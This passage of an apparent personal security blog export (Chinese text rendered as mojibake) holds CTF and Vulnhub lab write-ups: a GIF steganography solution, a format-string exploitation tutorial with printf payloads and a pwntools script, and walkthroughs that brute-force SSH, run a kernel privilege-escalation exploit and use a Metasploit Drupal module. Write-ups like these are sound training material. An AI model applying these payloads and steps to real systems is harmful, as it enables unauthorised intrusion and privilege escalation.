class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">            f1.write(binascii.unhexlify(i[:-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/670fbd51d29ded1a8c4b7312.png"></p><p>å°†æ‹¿åˆ°çš„æ•°æ®å»é™¤ç¬¬ä¸€è¡Œå’Œæœ€åä¸€è¡Œä»¥åŠæ¯è¡Œæœ€å¼€å§‹çš„$$START$$å¹¶å»é™¤æ¢è¡Œç¬¦</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data3.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data4.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">            <span class="keyword">if</span> i.startswith(<span class="string">b&#x27;$$START$$&#x27;</span>):</span><br><span class="line">                i = i.replace(<span class="string">b&#x27;$$START$$&#x27;</span>,<span class="string">b&#x27;&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">            i = i.rstrip(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            f1.write(i)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„æ•°æ®æ‹¿åˆ°cyberchefä¸­base64è§£å¯†</p><p>ä¸‹è½½è§£å¯†å‡ºæ¥çš„å‹ç¼©åŒ…</p><p>å‘ç°æ˜¯ä¸€å¼ gifåŠ¨å›¾</p><p>é€å¸§æŸ¥çœ‹æ²¡æœ‰å‘ç°flag</p><p>æœç´¢åå¾—çŸ¥gifè¿˜å¯ä»¥æ—¶é—´éšå†™ï¼ˆåŸç†å°±æ˜¯æ¯å¸§çš„æ—¶é—´é•¿åº¦ä¸ä¸€æ ·ï¼‰</p><p><strong><code>identify -format &quot;%s %T \n&quot; flag.gif</code></strong></p><p><img src="https://pic.imgdb.cn/item/670fbe8ad29ded1a8c4c70d5.png"></p><p>ä½¿ç”¨å‘½ä»¤è§£å¯†åå°†20ä¸º0 50ä¸º1å¾—åˆ°ä¸€ä¸²äºŒè¿›åˆ¶æ•°æ®</p><p><code>011011010100010000110101010111110011000101110100</code></p><p>è½¬ä¸ºåè¿›åˆ¶åå†è½¬ä¸ºåå…­è¿›åˆ¶</p><p><img src="https://pic.imgdb.cn/item/670fbf2fd29ded1a8c4ceeb0.png"></p><p><img src="https://pic.imgdb.cn/item/670fbf5cd29ded1a8c4d11c6.png"></p><p>åå…­è¿›åˆ¶è½¬ä¸ºasciiåå¾—åˆ°<code>md5_it</code></p><p><img src="https://pic.imgdb.cn/item/670fbf76d29ded1a8c4d2492.png"></p><p>md5åŠ å¯†åå¾—åˆ°flag</p><p><img src="https://pic.imgdb.cn/item/670fbfc4d29ded1a8c4d5f36.png"></p><p>flag{37e733cce7fbe623a5cc3deee8176c78}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> MISC </category>
          
          <category> BUUCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> BUUCTF </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²</title>
      <link href="/posts/7fabda03/"/>
      <url>/posts/7fabda03/</url>
      
        <content type="html"><![CDATA[<h1 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h1><p>åœ¨å †å­¦ä¹ çš„è¿‡ç¨‹ä¸­ æœ‰ç‚¹å¿˜è®°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„çŸ¥è¯†äº† ç»“åˆCTFWiKiä¸Šçš„çŸ¥è¯†æ€»ç»“ä¸€ä¸‹</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¸»è¦æ˜¯ç”±äºç¨‹åºä¸å®‰å…¨åœ°ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ï¼ˆå¦‚Cè¯­è¨€ä¸­çš„<code>printf</code>ã€<code>sprintf</code>ã€<code>fprintf</code>ç­‰ï¼‰å¯¼è‡´çš„ã€‚</p><p>å¸¸ç”¨çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å«ä¹‰</p><ul><li>%p æ‰“å°æ ˆä¸Šçš„æ•°æ®â€˜</li><li>%s å°†æ ˆä¸Šçš„æ•°æ®ä½œä¸ºåœ°å€è§£æï¼Œæ‰“å°è§£æåçš„æ•°æ®</li><li>%x ä»¥åå…­è¿›åˆ¶çš„æ–¹å¼æ‰“å°</li></ul><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><h3 id="æ³„éœ²å†…å­˜"><a href="#æ³„éœ²å†…å­˜" class="headerlink" title="æ³„éœ²å†…å­˜"></a>æ³„éœ²å†…å­˜</h3><h4 id="æ³„éœ²æ ˆå†…å­˜"><a href="#æ³„éœ²æ ˆå†…å­˜" class="headerlink" title="æ³„éœ²æ ˆå†…å­˜"></a>æ³„éœ²æ ˆå†…å­˜</h4><p>æ³„éœ²å†…å­˜å¯ä»¥æ³„éœ²æ ˆå†…å­˜æ¥è·å–æŸä¸ªå˜é‡çš„å€¼æˆ–æŸä¸ªå˜é‡å¯¹åº”åœ°å€çš„å†…å­˜</p><p>ä¹Ÿå¯ä»¥ä¸GOTè¡¨ç»“åˆï¼Œæ³„éœ²æŸä¸ªå‡½æ•°çš„å®é™…åœ°å€ï¼Œè¿›è€Œæ³„éœ²libcç‰ˆæœ¬ï¼Œè·å–åˆ°å…¶ä»–libcå‡½æ•°çš„åœ°å€</p><p>ä»¥CTFWiKiä¸Šçš„ä¾‹å­ä¸ºä¾‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘åè¿è¡Œä¸€ä¸‹ è¾“å…¥<code>aaaa%x+%x+%x+%x</code>å°è¯•è·å–æ ˆä¸Šå˜é‡çš„æ•°å€¼</p><p><img src="https://pic.imgdb.cn/item/670bc99bd29ded1a8c1a154f.png"></p><p>ç¡®å®å¾—åˆ°äº†å†…å®¹</p><p>å¯ä»¥ä½¿ç”¨%n$xå®šå‘è·å–ç¬¬n+1ä¸ªå‚æ•°çš„å€¼</p><p><img src="https://pic.imgdb.cn/item/670bca29d29ded1a8c1a8404.png"></p><p>åŒæ—¶å¯ä»¥ä½¿ç”¨%sä»¥åŠ%n$sæ¥è·å–æ ˆå˜é‡å¯¹åº”çš„å­—ç¬¦ä¸²ä»¥åŠå®šå‘è·å–ç¬¬n+1ä¸ª</p><p>ä½†éœ€è¦æ ˆä¸Šçš„å€¼å¯ä»¥ä½œä¸ºåœ°å€æ¥è§£æ</p><p>åœ¨åšé¢˜è¿‡ç¨‹ä¸­ä¸€èˆ¬ç›´æ¥ä½¿ç”¨%p</p><h4 id="æ³„éœ²ä»»æ„åœ°å€å†…å­˜"><a href="#æ³„éœ²ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="æ³„éœ²ä»»æ„åœ°å€å†…å­˜"></a>æ³„éœ²ä»»æ„åœ°å€å†…å­˜</h4><p>é€šè¿‡å›ºå®šçš„åç§»æ³„éœ²æŸä¸ªlibcå‡½æ•°çš„GOTè¡¨å†…å®¹ï¼Œè¿›è€Œå¾—åˆ°è¿™ä¸ªå‡½æ•°çš„å®é™…åœ°å€</p><p>è¿™é‡Œæˆ‘ä»¬ä»¥buuctfä¸Šçš„ä¸€é“é¢˜ç›®ä¸ºä¾‹</p><p><a href="axb_2019_fmt32">https://buuoj.cn/challenges#axb_2019_fmt32</a></p><p>checksecæŸ¥çœ‹</p><p><img src="https://pic.imgdb.cn/item/670c7b3cd29ded1a8c911051.png"></p><p>å¼€å¯äº†éƒ¨åˆ†çš„RELROä¿æŠ¤ï¼Œä»¥åŠNXä¿æŠ¤</p><p>idaæŸ¥çœ‹åç¼–è¯‘ä»£ç </p><p><img src="https://pic.imgdb.cn/item/670c7fc8d29ded1a8c958f72.png"></p><p>è¿è¡Œè¾“å…¥<code>aaaa%p+%p+%p+%p+%p+%p+%p+%p+%p+%p+%p+%p+%p+%p+%p</code></p><p><img src="https://pic.imgdb.cn/item/670c8076d29ded1a8c96336a.png"></p><p>å¯ä»¥çœ‹åˆ°åç§»ä¸º8</p><p>é‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥æ„é€ <code>payload = b&#39;a&#39; + p32(puts_got) + b&#39;%8$s&#39;</code>å°†printf_gotçš„åœ°å€å†™åˆ°åç§»ä¸º8çš„åœ°æ–¹</p><p>å°†printfçš„çœŸå®åœ°å€æ‰“å°å‡ºæ¥ï¼Œè¿›è€Œæ³„éœ²libc</p><h3 id="è¦†ç›–å†…å­˜"><a href="#è¦†ç›–å†…å­˜" class="headerlink" title="è¦†ç›–å†…å­˜"></a>è¦†ç›–å†…å­˜</h3><h4 id="è¦†ç›–æ ˆå†…å­˜"><a href="#è¦†ç›–æ ˆå†…å­˜" class="headerlink" title="è¦†ç›–æ ˆå†…å­˜"></a>è¦†ç›–æ ˆå†…å­˜</h4><p>ä»¥CTFWiKiä¸Šçš„ä¾‹å­ä¸ºä¾‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified c.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified a for a small number.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified b for a big number!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie -o overwrite overwrite.c</span><br></pre></td></tr></table></figure><p>åŒæ ·è¿è¡Œåè¾“å…¥</p><p><img src="https://pic.imgdb.cn/item/670c84f2d29ded1a8c9a641e.png"></p><p>å‘ç°åç§»ä¸º6</p><p>è§‚å¯Ÿæºç¨‹åºå‘ç°è¾“å‡ºçš„0xff940fdcå¤„å­˜æ”¾çš„æ—¶cå˜é‡çš„åœ°å€</p><p>é‚£ä¹ˆå¦‚æœè¦ä¿®æ”¹cå˜é‡çš„å€¼ä¸º18åˆ™æ„é€ ***<code>payload = p32(c_addr) + &#39;%014d&#39; + b&#39;%6$n</code>***</p><p>**<code>p32(c_addr)</code>**ä¸º4ä½</p><p>**<code>&#39;%014d&#39;</code>**ï¼šç”¨æ¥ç”Ÿæˆä¸€æ®µ14ä½çš„å¡«å……è¾“å‡º</p><p>é‚£ä¹ˆå°±ä¼šå°†18å†™å…¥<strong>ç¬¬ 6 ä¸ªå‚æ•°æ‰€æŒ‡å‘çš„åœ°å€</strong>ï¼ˆä¹Ÿå°±æ˜¯ <code>c_addr</code>ï¼‰ã€‚</p><h4 id="è¦†ç›–ä»»æ„åœ°å€å†…å­˜"><a href="#è¦†ç›–ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="è¦†ç›–ä»»æ„åœ°å€å†…å­˜"></a>è¦†ç›–ä»»æ„åœ°å€å†…å­˜</h4><h5 id="è¦†ç›–å°æ•°å­—"><a href="#è¦†ç›–å°æ•°å­—" class="headerlink" title="è¦†ç›–å°æ•°å­—"></a>è¦†ç›–å°æ•°å­—</h5><p>åŒæ ·æ˜¯ä¸Šé¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬å°è¯•å°†aå¤„çš„å€¼è¦†ç›–ä¸º2</p><p>a,bæ—¶å…¨å±€å˜é‡ åœ¨idaä¸­å¯ä»¥æ‰¾åˆ°å®ƒä»¬çš„ä½ç½®</p><p><img src="https://pic.imgdb.cn/item/670c896fd29ded1a8c9e3c8e.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ **<code>payload = &#39;aa%8$naa&#39; + p32(a_addr)</code>**</p><ul><li><code>&#39;aa&#39;</code> åœ¨ payload ä¸­å ç”¨ 2 ä¸ªå­—ç¬¦ã€‚</li><li>åç»­ä½¿ç”¨ <code>%8$n</code> è¿›è¡Œæ”»å‡»æ—¶ï¼Œ<code>printf()</code> ä¼šè®¡ç®—<strong>æ€»å…±å·²æ‰“å°å­—ç¬¦çš„æ•°é‡</strong>ï¼Œå¹¶å°†è¯¥æ•°é‡å†™å…¥ç›®æ ‡åœ°å€ã€‚</li><li><strong><code>%8$n</code></strong> çš„ä½œç”¨æ˜¯ï¼šå°†å·²æ‰“å°å­—ç¬¦æ•°å†™å…¥ <strong>ç¬¬ 8 ä¸ªå‚æ•°æŒ‡å‘çš„åœ°å€</strong>ã€‚</li><li>ä¸ºäº†æ§åˆ¶æ ˆä¸Šç¬¬ 8 ä¸ªå‚æ•°çš„ä½ç½®ï¼Œé€šå¸¸æˆ‘ä»¬ä¼šåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­æ”¾å…¥ä¸€ä¸ª<strong>ç›®æ ‡åœ°å€</strong>ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬åœ¨ payload çš„æœ€åæ·»åŠ äº† <code>p32(a_addr)</code>ã€‚è¿™æ ·ï¼Œ**<code>a_addr</code>** æˆä¸ºæ ˆä¸Šçš„ç¬¬ 8 ä¸ªå‚æ•°åœ°å€ã€‚</li></ul><p>å³å¯å®ç°æˆåŠŸè¦†ç›–</p><h5 id="è¦†ç›–å¤§æ•°å­—"><a href="#è¦†ç›–å¤§æ•°å­—" class="headerlink" title="è¦†ç›–å¤§æ•°å­—"></a>è¦†ç›–å¤§æ•°å­—</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hh å¯¹äºæ•´æ•°ç±»å‹ï¼ŒprintfæœŸå¾…ä¸€ä¸ªä»charæå‡çš„intå°ºå¯¸çš„æ•´å‹å‚æ•°ã€‚</span><br><span class="line">h  å¯¹äºæ•´æ•°ç±»å‹ï¼ŒprintfæœŸå¾…ä¸€ä¸ªä»shortæå‡çš„intå°ºå¯¸çš„æ•´å‹å‚æ•°ã€‚</span><br><span class="line">ï¼ˆè§£é‡Šçš„å¾ˆæŠ½è±¡ï¼‰</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨%hhn å‘æŸä¸ªåœ°å€å†™å…¥å•å­—èŠ‚ï¼Œåˆ©ç”¨%hnå‘æŸä¸ªåœ°å€å†™å…¥åŒå­—èŠ‚</p><p>æ„é€ exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">b_addr = <span class="number">0x0804C01C</span></span><br><span class="line">payload = p32(b_addr) + p32(b_addr+ <span class="number">1</span>) + p32(b_addr + <span class="number">2</span>) + p32(b_addr + <span class="number">3</span>)</span><br><span class="line">payload += <span class="string">b&#x27;%104x&#x27;</span> + <span class="string">b&#x27;%6$hhn&#x27;</span> + <span class="string">b&#x27;%222x&#x27;</span> + <span class="string">b&#x27;%7$hhn&#x27;</span> + <span class="string">b&#x27;%222x&#x27;</span> + <span class="string">b&#x27;%8$hhn&#x27;</span> + <span class="string">b&#x27;%222x&#x27;</span> + <span class="string">b&#x27;%9$hhn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline(fmtstr_payload(6, &#123;b_addr : 0x12345678&#125;))</span></span><br><span class="line"><span class="comment">#å¯ä»¥ç›´æ¥ä½¿ç”¨fmtstr_payloadå‡½æ•°...</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸²payoladæ¯ä¸ªp32æ˜¯4å­—èŠ‚ï¼Œä¸€å…±æ˜¯16å­—èŠ‚</p><p>é‚£ä¹ˆç®—åˆ°%6$hhnå‰é¢å°±æ˜¯ï¼š16 + 104 &#x3D; 120 åå…­è¿›åˆ¶0x78</p><p>å†åŠ ä¸Š222å°±æ˜¯342 åå…­è¿›åˆ¶x0156</p><p>ä¾æ¬¡æ˜¯ 0x234,0x312 hhå†™å…¥å•å­—èŠ‚ï¼Œå¹¶ä¸”æ˜¯å°ç«¯å­˜å‚¨ æ‰€ä»¥å¯¹äºä¸‰ä½åªå–åä¸¤ä½</p><p>æ‰€ä»¥è¿èµ·æ¥å°±æ˜¯0x12345678</p><p>å†è®°ä¸€ä¸‹fmtstr_payloadå‡½æ•°çš„ç”¨æ³•</p><p>å‡½æ•°åŸå‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>, strategy=<span class="string">&#x27;fast&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>å‚æ•°è¯´æ˜ï¼š</strong></p><ul><li>**<code>offset</code>**ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»é‡ï¼Œå³ç¬¬ä¸€ä¸ªç”¨æˆ·å¯æ§çš„è¾“å…¥åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„ä½ç½®ã€‚é€šå¸¸é€šè¿‡<code>%x</code>é€ä¸ªè¯•æ¢å¾—å‡ºã€‚</li><li>**<code>writes</code>**ï¼šå­—å…¸ç±»å‹ï¼Œé”®ä¸ºå¾…å†™å…¥çš„å†…å­˜åœ°å€ï¼Œå€¼ä¸ºè¦å†™å…¥çš„å€¼ã€‚<br>ä¾‹å¦‚ï¼š<code>&#123;0x804a00c: 0xdeadbeef&#125;</code> è¡¨ç¤ºå°†<code>0xdeadbeef</code>å†™å…¥åœ°å€<code>0x804a00c</code>ã€‚</li><li>**<code>numbwritten</code>**ï¼šå¯é€‰å‚æ•°ï¼Œè¡¨ç¤ºå·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°ï¼Œè¿™ä¼šå½±å“å‰©ä½™çš„å¡«å……é•¿åº¦ã€‚</li><li>**<code>write_size</code>**ï¼šå†™å…¥çš„ç²’åº¦ï¼Œå–å€¼ä¸º<code>&#39;byte&#39;</code>ã€<code>&#39;short&#39;</code>æˆ–<code>&#39;int&#39;</code>ï¼Œåˆ†åˆ«è¡¨ç¤ºä»¥1å­—èŠ‚ã€2å­—èŠ‚æˆ–4å­—èŠ‚ä¸ºå•ä½è¿›è¡Œå†™å…¥ã€‚</li><li>**<code>strategy</code>**ï¼š<code>&#39;fast&#39;</code>æˆ–<code>&#39;filled&#39;</code>ã€‚<code>fast</code>ç”¨äºç”Ÿæˆè¾ƒçŸ­çš„payloadï¼Œè€Œ<code>filled</code>ç”¨äºç¡®ä¿æ¯æ¬¡å†™å…¥çš„é•¿åº¦å¯¹é½ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-Potato</title>
      <link href="/posts/ee0929c4/"/>
      <url>/posts/ee0929c4/</url>
      
        <content type="html"><![CDATA[<h2 id="Vulnhubâ€“potato"><a href="#Vulnhubâ€“potato" class="headerlink" title="Vulnhubâ€“potato"></a>Vulnhubâ€“potato</h2><p>é¶æœºä¸‹è½½å¥½åå°†ç½‘ç»œé…ç½®ä¿®æ”¹ä¸ºNATæ¨¡å¼</p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>é¦–å…ˆkaliä¸­<code>arp-scan -l</code>æ‰«æé¶æœºçš„ipåœ°å€</p><p><img src="https://pic.imgdb.cn/item/66e908e3d9c307b7e99ed75f.png"></p><p>æ‰«æåˆ°ipånmapæ‰«æå¼€æ”¾çš„ç«¯å£</p><p><img src="https://pic.imgdb.cn/item/66e90966d9c307b7e99f42d0.png"></p><p>-sS ä½¿ç”¨åŠå¼€æ”¾æ‰«æ</p><p>-sV ç‰ˆæœ¬æ¢æµ‹</p><p>-sC ä½¿ç”¨é»˜è®¤è„šæœ¬æ‰«æ</p><p>-p- æ‰«ææ‰€æœ‰ç«¯å£ï¼Œé»˜è®¤æƒ…å†µä¸‹åªæ‰«æå¸¸è§çš„1000ä¸ªç«¯å£ï¼Œè¿™ä¸ªé€‰é¡¹ä¼šæ‰«ææ‰€æœ‰çš„65535ä¸ªTCPç«¯å£</p><p>æ‰«æåˆ°ä¸¤ä¸ªå¼€æ”¾çš„ç«¯å£ã€‚7120å¼€æ”¾sshåè®®</p><p>è®¿é—®ä¸‹é¶æœºçš„ç½‘é¡µé¡µé¢</p><p><img src="https://pic.imgdb.cn/item/66e90a8ad9c307b7e9a0304d.png"></p><p>å’Œé¶æœºåå­—å¾ˆç¬¦åˆï¼Œåªæ˜¯ä¸€ä¸ªåœŸè±†</p><p>å°è¯•çˆ†ç ´7120ç«¯å£ï¼Œä½¿ç”¨potatoä½œä¸ºç”¨æˆ·å</p><p><img src="https://pic.imgdb.cn/item/66e90baed9c307b7e9a12e3d.png"></p><p><img src="https://pic.imgdb.cn/item/66e90b89d9c307b7e9a10c36.png"></p><p>æˆåŠŸæ‹¿åˆ°ç”¨æˆ·åå’Œå¯†ç </p><p>sshå°è¯•è¿œç¨‹ç™»å½•</p><p><img src="https://pic.imgdb.cn/item/66e90bfdd9c307b7e9a170eb.png"></p><p>ç™»å½•æˆåŠŸ</p><p>åœ¨ä¹‹å‰nmapæ‰«æç«¯å£è¯¦ç»†ä¿¡æ¯æ—¶çŸ¥é“äº†æ—¶ubuntuç³»ç»Ÿï¼ŒæŸ¥çœ‹ä¸€ä¸‹å…·ä½“çš„ubuntuç‰ˆæœ¬ä¿¡æ¯</p><p><img src="https://pic.imgdb.cn/item/66e90c68d9c307b7e9a1d3ca.png"></p><p>åœ¨å¦ä¸€ä¸ªç»ˆç«¯æŸ¥çœ‹ubuntu14çš„æ¼æ´ä¿¡æ¯</p><p><img src="https://pic.imgdb.cn/item/66e90cc1d9c307b7e9a2340c.png"></p><p>linux&#x2F;local&#x2F;37292.cï¼Œå¸¸è§çš„æœ¬åœ°ææƒæ¼æ´ï¼Œéå¸¸é€‚ç”¨äºubuntu14.04</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´è¿›è¡Œææƒ</p><p>é¦–å…ˆå°†è¿™ä¸ªæ¼æ´çš„ä»£ç ç§»åŠ¨åˆ°kaliçš„ä¸»æ–‡ä»¶å¤¹ä¸‹</p><p><img src="https://pic.imgdb.cn/item/66e90e4ed9c307b7e9a41c11.png"></p><p>kaliå¼€å¯webæœåŠ¡</p><p><img src="https://pic.imgdb.cn/item/66e90e9cd9c307b7e9a47265.png"></p><p>ifconfigè·å¾—kaliä¸»æœºçš„ipåœ°å€</p><p><img src="https://pic.imgdb.cn/item/66e90ed3d9c307b7e9a4ba29.png"></p><p>ä½¿ç”¨wgetä»kaliå¼€å¯çš„httpæœåŠ¡ä¸‹ä¸‹è½½37292.c</p><p><img src="https://pic.imgdb.cn/item/66e90f3bd9c307b7e9a54118.png"></p><p>ä½¿ç”¨gccç¼–è¯‘37292.cé‡å‘½åä¸ºexp</p><p><img src="https://pic.imgdb.cn/item/66e90fdbd9c307b7e9a6049a.png"></p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>è¿è¡ŒexpåææƒæˆåŠŸ</p><p><img src="https://pic.imgdb.cn/item/66e9100ed9c307b7e9a63cfb.png"></p><p>åˆ‡æ¢åˆ°rootç›®å½•åæ‹¿åˆ°flag</p><p><img src="https://pic.imgdb.cn/item/66e91044d9c307b7e9a66b6f.png"></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ </category>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨ </tag>
            
            <tag> æ¸—é€ </tag>
            
            <tag> é¶æœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC1</title>
      <link href="/posts/3bdfdcb0/"/>
      <url>/posts/3bdfdcb0/</url>
      
        <content type="html"><![CDATA[<h2 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h2><h3 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h3><p>é¦–å…ˆå°†è™šæ‹Ÿé¶æœºçš„ç½‘ç»œè®¾ç½®ä¸ºnetæ¨¡å¼</p><p>é¦–å…ˆ<code>arp-scan-l</code>æ‰«æå­˜æ´»ä¸»æœº</p><p><img src="https://pic.imgdb.cn/item/66e23295d9c307b7e90b4ea0.png"></p><p>æµè§ˆå™¨é¡µé¢è®¿é—®ä¸»æœº</p><p><img src="https://pic.imgdb.cn/item/66e232ced9c307b7e90b7d95.png"></p><p>nmapæ‰«æå¼€æ”¾çš„ç«¯å£</p><p><img src="https://pic.imgdb.cn/item/66e2330ad9c307b7e90ba02b.png"></p><p>ç»§ç»­æ‰«æç«¯å£çš„ç‰ˆæœ¬ä¿¡æ¯</p><p><img src="https://pic.imgdb.cn/item/66e23351d9c307b7e90bcfe5.png"></p><p>åˆ†æé¡µé¢ä¿¡æ¯<code>whatweb 192.168.154.137</code></p><p><img src="https://pic.imgdb.cn/item/66e2339ad9c307b7e90c0138.png"></p><p>å‘ç°ç½‘é¡µçš„CMSæ¡†æ¶æ˜¯Drupal7ï¼Œæœç´¢Drupal7å­˜åœ¨çš„æ¼æ´</p><p><img src="https://pic.imgdb.cn/item/66e234fed9c307b7e90d1091.png"></p><p>é‚£ä¹ˆç›´æ¥è¿›å…¥msf  <code>msfconsole</code></p><p><code>search drupal</code></p><p><img src="https://pic.imgdb.cn/item/66e2364bd9c307b7e90e017f.png"></p><p>ä½¿ç”¨ç¬¬äºŒä¸ª</p><p>ä½¿ç”¨<code>set rhosts</code>è®¾ç½®ç›®æ ‡é¶æœºçš„ip</p><p><img src="https://pic.imgdb.cn/item/66e236ced9c307b7e90e6504.png"></p><p>run è¿è¡ŒålsæŸ¥çœ‹ç½‘ç«™ç›®å½•ç»“æ„</p><p><img src="https://pic.imgdb.cn/item/66e23751d9c307b7e90ec6ea.png"></p><p>å‘ç°flag1.txtå°è¯•cat å‘ç°æç¤ºä¿¡æ¯</p><p><img src="https://pic.imgdb.cn/item/66e25865d9c307b7e93bd95c.png"></p><p>æç¤ºåœ¨é…ç½®æ–‡ä»¶ä¸­</p><p>è¾“å…¥shellåç”¨pythonå†™ä¸€æ®µäº¤äº’å¼è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p><img 